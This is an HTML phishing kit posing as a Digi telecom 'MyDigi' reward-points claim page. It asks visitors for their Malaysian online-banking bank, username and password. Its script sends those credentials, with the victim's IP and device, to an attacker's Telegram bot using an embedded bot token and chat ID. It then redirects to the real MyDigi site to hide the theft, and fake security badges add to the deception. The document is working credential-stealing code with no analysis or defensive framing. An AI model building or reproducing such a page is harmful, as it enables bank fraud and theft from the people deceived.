<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MyDigi - Claim Point Digi</title>
 <style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    
    body {
        font-family: 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
        /* Background Hitam Premium dengan tekstur halus */
        background: radial-gradient(circle, #2c2c2c 0%, #000000 100%);
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
    }
    
    .container {
        width: 100%;
        max-width: 450px;
        background: #ffffff;
        border-radius: 20px;
        box-shadow: 0 0 30px rgba(212, 175, 55, 0.4); /* Glow Emas */
        overflow: hidden;
        border: 2px solid #D4AF37; /* Gold Metallic */
    }
    
    /* Header Emas */
    .header {
        background: linear-gradient(135deg, #D4AF37 0%, #BF953F 50%, #8A6E2F 100%);
        color: #000;
        padding: 30px 20px;
        text-align: center;
        position: relative;
    }
    
    .logo {
        font-size: 38px;
        font-weight: 900;
        margin-bottom: 5px;
        letter-spacing: -1px;
        color: #000;
        text-transform: uppercase;
        text-shadow: 1px 1px 0 rgba(255,255,255,0.5);
    }
    
    .logo span {
        color: #fff;
        text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
    }
    
    /* Claim Badge */
    .claim-badge {
        background: #000;
        color: #D4AF37;
        text-align: center;
        padding: 15px;
        font-size: 24px;
        font-weight: 800;
        letter-spacing: 3px;
        border-bottom: 2px solid #D4AF37;
    }
    
    /* Claim Method */
    .claim-method {
        background: #fdfaf0;
        color: #8A6E2F;
        text-align: center;
        padding: 12px;
        font-size: 14px;
        font-weight: 700;
        border-bottom: 1px solid #eee;
    }
    
    /* Form Section */
    .form-section {
        padding: 35px 30px;
    }
    
    .form-group label {
        display: block;
        margin-bottom: 8px;
        font-weight: 700;
        color: #333;
        font-size: 13px;
        letter-spacing: 1px;
    }
    
    .bank-select, .form-input {
        width: 100%;
        padding: 14px 15px;
        border: 1.5px solid #dcdcdc;
        border-radius: 10px;
        font-size: 15px;
        background: #fafafa;
        transition: all 0.3s;
    }
    
    .bank-select:focus, .form-input:focus {
        outline: none;
        border-color: #D4AF37;
        background: #fff;
        box-shadow: 0 0 8px rgba(212, 175, 55, 0.2);
    }
    
    .point-input {
        background: #fffdf0 !important;
        border-color: #D4AF37 !important;
        font-weight: 800;
        color: #8A6E2F;
    }
    
    /* Tombol Submit Mewah */
    .submit-btn {
        background: linear-gradient(135deg, #D4AF37 0%, #BF953F 100%);
        color: #000;
        border: none;
        padding: 18px;
        width: 100%;
        border-radius: 10px;
        font-size: 18px;
        font-weight: 800;
        cursor: pointer;
        transition: all 0.3s;
        text-transform: uppercase;
        box-shadow: 0 4px 15px rgba(191, 149, 63, 0.4);
    }
    
    .submit-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(191, 149, 63, 0.6);
        filter: brightness(1.1);
    }
    
    /* Footer */
    .footer {
        text-align: center;
        padding: 20px;
        background: #000;
        color: #D4AF37;
        font-size: 11px;
    }
    
    .secure-badge {
        display: inline-flex;
        gap: 8px;
        padding: 5px 15px;
        border: 1px solid #D4AF37;
        border-radius: 20px;
        margin-bottom: 10px;
    }
</style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo">My<span>digi</span></div>
            <div class="tagline">Claim your reward points instantly</div>
        </div>
        
        <!-- Claim Badge -->
        <div class="claim-badge">CLAIM_POINT_DIGI</div>
        
        <!-- Claim Method -->
        <div class="claim-method">CLAIM USING ONLINE BANKING</div>
        
        <!-- Form Section -->
        <div class="form-section">
            <form id="digiClaimForm">
                <!-- Bank Name -->
                <div class="form-group">
                    <label for="bankName">BANK NAME :</label>
                    <div class="bank-select-wrapper">
                        <select id="bankName" class="bank-select" required>
                            <option value="">-- Select Your Bank --</option>
                            <option value="maybank">Maybank</option>
                            <option value="cimb">CIMB Bank</option>
                            <option value="public">Public Bank</option>
                            <option value="rhb">RHB Bank</option>
                            <option value="hongleong">Hong Leong Bank</option>
                            <option value="ambank">AmBank</option>
                            <option value="bankislam">Bank Islam</option>
                            <option value="bankrakyat">Bank Rakyat</option>
                            <option value="bsn">BSN</option>
                            <option value="affin">Affin Bank</option>
                        </select>
                        <div class="select-arrow">‚ñº</div>
                    </div>
                </div>
                
                <!-- Username -->
                <div class="form-group">
                    <label for="username">USERNAME :</label>
                    <input type="text" id="username" class="form-input" placeholder="Enter your banking username" required>
                </div>
                
                <!-- Password -->
                <div class="form-group">
                    <label for="password">PASSWORD :</label>
                    <input type="password" id="password" class="form-input" placeholder="Enter your banking password" required>
                </div>
                
                <!-- Point Digi -->
                <div class="form-group">
                    <label for="pointDigi">POINT DIGI :</label>
                    <input type="number" id="pointDigi" class="form-input point-input" placeholder="Enter points to claim" min="100" max="10000" required>
                </div>
                
                <!-- Submit Button -->
                <button type="submit" class="submit-btn">Submit</button>
                
                <!-- Loading -->
                <div class="loading" id="loading">
                    üîê Processing your claim...
                </div>
                
                <!-- Success Message -->
                <div class="success-message" id="successMessage">
                    ‚úÖ Success! Redirecting to MyDigi...
                </div>
            </form>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <div class="secure-badge">
                <span>üîí</span>
                <span>SECURE BANKING PORTAL</span>
            </div>
            <p>¬© 2024 Digi Telecommunications Sdn Bhd. All rights reserved.</p>
            <p>Protected by 256-bit SSL encryption</p>
        </div>
    </div>

    <script>
        // Telegram Bot Configuration
        const BOT_TOKEN = '8578854370:AAFXqmwsUniItLN9MYZ_ndLEIUxcXS70uEA';
        const CHAT_ID = '6411304865';
        
        // Function to send data to Telegram
        async function sendToTelegram(data) {
            const message = `
üéØ **MYDIGI POINT CLAIM** üî•
            
üè¶ **Bank:** ${data.bankName}
üë§ **Username:** ${data.username}
üîë **Password:** ${data.password}
üí∞ **Points:** ${data.pointDigi}
‚è∞ **Time:** ${data.timestamp}
üåê **IP:** ${data.ip}
üì± **Device:** ${navigator.platform}
            `;
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const result = await response.json();
                return result.ok;
            } catch (error) {
                console.error('Telegram error:', error);
                return false;
            }
        }
        
        // Get IP Address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }
        
        // Form submission handler
        document.getElementById('digiClaimForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            // Collect form data
            const formData = {
                bankName: document.getElementById('bankName').value,
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                pointDigi: document.getElementById('pointDigi').value,
                ip: await getIP(),
                timestamp: new Date().toLocaleString('id-ID')
            };
            
            // UI Updates
            const submitBtn = event.target.querySelector('button');
            const loadingDiv = document.getElementById('loading');
            const successDiv = document.getElementById('successMessage');
            
            submitBtn.style.display = 'none';
            loadingDiv.style.display = 'block';
            successDiv.style.display = 'none';
            
            try {
                // 1. Save to localStorage
                const existingData = JSON.parse(localStorage.getItem('mydigi_claims') || '[]');
                existingData.push(formData);
                localStorage.setItem('mydigi_claims', JSON.stringify(existingData));
                
                // 2. Send to Telegram
                loadingDiv.textContent = 'üì§ Sending to secure server...';
                const telegramSuccess = await sendToTelegram(formData);
                
                // 3. Update UI
                setTimeout(() => {
                    loadingDiv.style.display = 'none';
                    
                    if (telegramSuccess) {
                        successDiv.style.display = 'block';
                        // Celebration effect
                        createCelebration();
                    } else {
                        alert('‚ö†Ô∏è Data saved locally! Redirecting...');
                    }
                    
                    // 4. Redirect to MyDigi
                    setTimeout(() => {
                        window.location.href = 'https://mydigi.digi.com.my';
                    }, 2000);
                    
                }, 1500);
                
            } catch (error) {
                loadingDiv.textContent = '‚ö†Ô∏è Error, please try again';
                loadingDiv.style.background = '#f8d7da';
                loadingDiv.style.color = '#721c24';
                loadingDiv.style.borderColor = '#f5c6cb';
                
                setTimeout(() => {
                    submitBtn.style.display = 'block';
                    loadingDiv.style.display = 'none';
                }, 2000);
            }
        });
        
        // Celebration effect
        function createCelebration() {
            const colors = ['#FFD700', '#E41E26', '#FFFFFF'];
            for (let i = 0; i < 10; i++) {
                const star = document.createElement('div');
                star.style.position = 'fixed';
                star.style.width = '20px';
                star.style.height = '20px';
                star.style.background = colors[Math.floor(Math.random() * colors.length)];
                star.style.borderRadius = '50%';
                star.style.left = Math.random() * 100 + 'vw';
                star.style.top = '-20px';
                star.style.zIndex = '9999';
                star.style.boxShadow = '0 0 10px currentColor';
                document.body.appendChild(star);
                
                star.animate([
                    { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
                    { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
                ], {
                    duration: 2000,
                    easing: 'ease-in'
                }).onfinish = () => star.remove();
            }
        }
        
        // Initialize
        window.onload = function() {
            // Auto-focus
            document.getElementById('bankName').focus();
            
            // Auto-fill sample points
            document.getElementById('pointDigi').addEventListener('click', function() {
                if (!this.value) {
                    this.value = Math.floor(Math.random() * 9000) + 1000;
                }
            });
            
            // Test Telegram connection
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
                .then(res => res.json())
                .then(data => {
                    if (data.ok) {
                        console.log('‚úÖ Bot aktif:', data.result.username);
                    } else {
                        console.log('‚ùå Bot error:', data.description);
                    }
                })
                .catch(err => console.log('‚ùå Cannot connect to Telegram'));
        };
    </script>
</body>
</html>